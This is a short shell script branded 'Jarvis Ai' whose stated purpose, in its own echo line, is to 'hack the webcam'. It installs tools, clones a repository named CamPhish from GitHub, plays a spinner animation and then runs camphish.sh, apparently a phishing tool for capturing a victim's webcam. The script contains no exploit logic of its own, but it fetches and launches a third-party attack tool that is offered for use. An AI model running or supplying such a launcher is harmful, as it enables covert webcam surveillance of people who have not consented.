echo "Welcome To Jarvis Ai !!!!"
apt install figlet
figlet Jarvis Ai
apt install python 
apt install python3
apt install git
apt install wget
echo "ok now let's hack the webcam"
git clone https://github.com/techchipnet/CamPhish
echo "Program starting in Progress please stay patient"
#!/bin/bash

clear
spinner=( Ooooo oOooo ooOoo oooOo ooooO oooOo ooOoo oOooo);


count(){
  spin &
  pid=$!

  for i in `seq 1 10`
  do
    sleep 1;
  done

  kill $pid  
}

spin(){
  while [ 1 ]
  do 
    for i in ${spinner[@]}; 
    do 
      echo -ne "\r$i";
      sleep 0.2;
    done;
  done
}

count

echo "Program Started"
sleep 3
cd CamPhish
bash camphish.sh
